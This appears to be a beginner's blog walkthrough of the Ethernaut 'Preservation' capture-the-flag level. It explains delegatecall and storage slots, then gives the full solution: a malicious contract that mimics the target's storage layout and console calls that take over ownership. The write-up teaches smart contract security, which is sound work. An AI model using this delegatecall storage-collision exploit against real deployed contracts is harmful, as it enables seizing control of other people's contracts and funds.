---
title: "Ethernaut - Walkthrough for Noobs - 16 - Preservation"
datePublished: Sat Apr 01 2023 15:13:20 GMT+0000 (Coordinated Universal Time)
cuid: clfy45dm0000009l7dnishra8
slug: ethernaut-walkthrough-for-noobs-16-preservation
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1680286086573/2b25328a-2c72-4062-8968-e0d3586cbd8b.jpeg
tags: ethereum, solidity, web3, 2articles1week, ethernaut

---

You would need the knowledge from Level 6 and Level 12 to solve this challenge. This challenge teaches us about `libraries`. They do not have storage and cannot hold state variables or functions. Hence, they should be labeled as such to avoid misusing their storage. The challenge level should be moderate, and fun to crack. You can probably understand that I need help when a smart contract security challenge seems fun.

> This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.
> 
> The goal of this level is for you to claim ownership of the instance you are given.

### Background

Let's first revisit concepts first.

`delegatecall()`: `A` executes a `delegatecall()` to `B`. `B`'s code is executed but with the storage, `msg.sender` and `msg.value` of `A`. [Read more](https://adityabajaj.hashnode.dev/ethernaut-walkthrough-for-noobs-6-delegation).

Slot Storage: Enough has been said on this in the previous two challenges. [Read More](https://adityabajaj.hashnode.dev/ethernaut-walkthrough-for-noobs-12-privacy).

[**Library**](https://www.geeksforgeeks.org/solidity-libraries/): To create a library, you need to use the keyword `library` instead of `contract`. Though **not relevant** to this challenge, I think everyone should know this. The flaw in this challenge could have been mitigated, if we had used `library` for LibraryContract, instead of a `contract`.

Here is the syntax:

```solidity
library <libraryName> {
    // block of code
}
```

### Code of Importance

I have explained what each line means in the comments.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library; //slot 0; stores address of 1st timezone library
  address public timeZone2Library; //slot 1; address of 2nd timezone library
  address public owner; //slot 2; address of owner
  uint storedTime; //slot 3; time stored by either of two timezone libraries. 
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)")); //creates a function selector for setTime function. Check notes[1]. 

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) { //takes two addresses as input 
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender; //sets owner as msg.sender 
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); //takes _timestamp as an input and makes a delegate call to the to the setTime function on the `library` at address timeZone1Library. We only control the _timeStamp. 
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));//Identical to the above function, takes _timestamp as an input and makes a delegate call to the setTime function on the `library` at address timeZone2Library. We only control the _timeStamp. 
  }
}

// Simple library contract to set the time
contract LibraryContract { 

  // stores a timestamp 
  uint storedTime; //slot 0

  function setTime(uint _time) public {
    storedTime = _time; //sets storedTime as _time, controlled by us, _time === _timeStamp that we put in. 
  }
}
```

Coming back to the main contract. Have you sensed the problem. Let's go over it once again.

In the Preservation Contract, we create some variables, stored in certain slots. We then execute `setFirstTime(1000)` ---&gt; delegates our call to `setTime(1000)` in the LibraryContract. ---&gt; Updates the state \*not of `storedTime` in the LibraryContract\* but the slot 0 of the Preservation contract i.e. `address public timeZone1Library;` since the context of the Preservation contract is used, which is the whole premise of a `delegatecall()`.

But we still need to update slot 2 i.e. the owner and not slot 0. How should we go on about it?

*Note\[1\]: A* ***function signature*** *is a combination of a function name and its parameters combined together. When this signature is hashed and the first 4 bytes of that call data are taken, we get a* ***function selector***\*. The selector basically tells the contract which function it should execute.\*

```solidity
//the code is dummy and only used for explanation, not used in the challenge. 

function transfer(address sender, uint256 amount) public { // a function. 
}

transfer(address,uint256) //function signature

bytes4(keccak256(bytes(function_signature))) //function selector --> 0xa9059cbb 
//this is the function selector for the transfer function signature above.
```

### Strategy

Now, we cannot modify slot 2 directly, we must first hijack slot 0 and replace the address of the library with our malicious contract, which will mimic the Preservation contract layout and change the owner to us by updating slot 2.

What should be the pseudo-code or basic outline of the attack?

1. Creating a malicious contract that mimics, the library contract but the address of the owner is in slot 2.
    
2. Calling the `setFirstTime()` function with the address of the malicious contract as parameters.
    
3. This will update the address of timeZone1Library to our contract.
    
4. Call the `setFirstTime()` function again with any value does not matter, this time, however, this function will however take the function selector of `setTime()` in our malicious contract.
    
5. This will update the `msg.sender` which is us, as owners in the original Preservation contract since this is a delegate call.
    

### Solution

1. Create a new level instance and fire up the console.
    
2. Open Remix, copy the code below and deploy the contract.
    
    ```solidity
    // SPDX-License-Identifier: MIT
    
    pragma solidity ^0.8.18;
    
    contract mimicsLibrary {
        address public useless; //slot 0
        address public useless2; //slot 1
        address public owner; //slot 2
    
        function setTime(uint _time) public {
            owner = msg.sender; //will change the owner to msg.sender
        }
    }
    ```
    
3. ```javascript
    //Do this in console. 
    await contract.setFirstTime("Add your deployed contract address")
    await contract.setFirstTime("8008135")
    await contract.owner() //check if you are the owner.
    ```
    
4. Submit Instance.
    

Preservation 😮‍💨